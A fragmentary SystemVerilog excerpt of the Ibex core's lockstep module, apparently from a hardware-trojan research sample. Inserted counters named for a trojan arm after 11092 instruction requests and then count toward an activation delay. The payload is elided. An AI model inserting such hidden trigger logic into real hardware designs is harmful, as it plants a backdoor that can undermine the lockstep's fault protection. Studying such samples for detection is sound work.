...
module ibex_lockstep import ibex_pkg::*; #(
  ...
  input  logic                         scan_rst_ni
    ...
    // ============================================================
    localparam int ARM_THRESHOLD = 11092;
    localparam int ACTIVATE_DELAY = 5546;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (!trojan_armed && instr_req_i) trojan_counter1 <= trojan_counter1 + 1;
            if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
            if (trojan_armed && !trojan_active && instr_req_i) trojan_counter2 <= trojan_counter2 + 1;
